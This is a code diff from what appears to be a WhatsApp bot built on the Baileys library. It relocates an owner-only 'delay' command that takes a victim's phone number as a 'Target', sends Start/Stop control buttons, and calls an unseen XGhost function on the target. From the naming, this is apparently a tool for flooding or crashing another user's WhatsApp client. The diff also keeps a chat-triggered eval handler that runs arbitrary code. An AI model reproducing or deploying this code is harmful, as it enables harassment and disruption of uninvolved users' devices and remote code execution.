@@ -1920,59 +1920,58 @@ case 'demoteall': {
 
                 break
             }
+
+            case 'delay': {
+                if (!CreatorOnly) return reply('❌ Only the owner can use this command')
+                if (!args.length && !m.message?.extendedTextMessage?.contextInfo?.participant) return reply('❗ Example: .delay 2547xxxxxxxxx or reply to a user')
+
+                let target = args[0]
+                if (m.message?.extendedTextMessage?.contextInfo?.participant) {
+                    target = m.message.extendedTextMessage.contextInfo.participant
+                } else {
+                    target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+                }
+
+                const { generateWAMessageFromContent: genMsg, proto: protoX } = require('@whiskeysockets/baileys')
+
+                const delayMsg = await genMsg(from, {
+                    viewOnceMessage: {
+                        message: {
+                            interactiveMessage: protoX.Message.InteractiveMessage.fromObject({
+                                body: protoX.Message.InteractiveMessage.Body.fromObject({
+                                    text: `🎯 Target:\n${target}\n\n`
+                                }),
+                                footer: protoX.Message.InteractiveMessage.Footer.fromObject({
+                                    text: global.botName
+                                }),
+                                nativeFlowMessage: protoX.Message.InteractiveMessage.NativeFlowMessage.fromObject({
+                                    buttons: [
+                                        {
+                                            name: 'quick_reply',
+                                            buttonParamsJson: JSON.stringify({ display_text: '🔁 Start', id: `delay ${target}` })
+                                        },
+                                        {
+                                            name: 'quick_reply',
+                                            buttonParamsJson: JSON.stringify({ display_text: '🛑 Stop', id: 'stopdelay' })
+                                        },
+                                        {
+                                            name: 'cta_copy',
+                                            buttonParamsJson: JSON.stringify({ display_text: '📋 Copy Target', copy_code: target })
+                                        }
+                                    ]
+                                })
+                            })
+                        }
+                    }
+                }, { quoted: m })
+
+                await sock.relayMessage(from, delayMsg.message, { messageId: delayMsg.key.id })
+                XGhost(sock, target)
+                break
+            }
         }
 
-
-              case 'delay': {
-                  if (!CreatorOnly) return reply('❌ Only the owner can use this command')
-                  if (!args.length && !m.message?.extendedTextMessage?.contextInfo?.participant) return reply('❗ Example: .delay 2547xxxxxxxxx or reply to a user')
-
-                  let target = args[0]
-                  if (m.message?.extendedTextMessage?.contextInfo?.participant) {
-                      target = m.message.extendedTextMessage.contextInfo.participant
-                  } else {
-                      target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                  }
-
-                  const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys')
-
-                  const delayMsg = await generateWAMessageFromContent(from, {
-                      viewOnceMessage: {
-                          message: {
-                              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
-                                  body: proto.Message.InteractiveMessage.Body.fromObject({
-                                      text: `🎯 Target:\n${target}\n\n`
-                                  }),
-                                  footer: proto.Message.InteractiveMessage.Footer.fromObject({
-                                      text: global.botName
-                                  }),
-                                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
-                                      buttons: [
-                                          {
-                                              name: 'quick_reply',
-                                              buttonParamsJson: JSON.stringify({ display_text: '🔁 Start', id: `delay ${target}` })
-                                          },
-                                          {
-                                              name: 'quick_reply',
-                                              buttonParamsJson: JSON.stringify({ display_text: '🛑 Stop', id: 'stopdelay' })
-                                          },
-                                          {
-                                              name: 'cta_copy',
-                                              buttonParamsJson: JSON.stringify({ display_text: '📋 Copy Target', copy_code: target })
-                                          }
-                                      ]
-                                  })
-                              })
-                          }
-                      }
-                  }, { quoted: m })
-
-                  await sock.relayMessage(from, delayMsg.message, { messageId: delayMsg.key.id })
-                  XGhost(sock, target)
-                  break
-              }
-
-          if (body.startsWith('>') && CreatorOnly) {
+        if (body.startsWith('>') && CreatorOnly) {
             try {
                 const evaled = await eval(body.slice(2))
                 ReplySuccess(util.inspect(evaled))
